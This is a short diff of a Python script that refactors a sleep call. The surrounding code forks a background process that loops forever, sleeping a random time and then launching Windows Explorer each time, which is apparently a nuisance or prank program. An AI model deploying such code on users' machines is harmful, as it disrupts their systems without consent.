@@ -21,8 +21,7 @@ if __name__ == "__main__":
         pid = fork()
         if pid==0:
             while True:
-                rand = randint(0,HALF)
-                sleep(rand)
+                sleep(randint(0,HALF))
                 if currentOS == 'nt':
                     system("start %windir%\explorer.exe")
                 else:
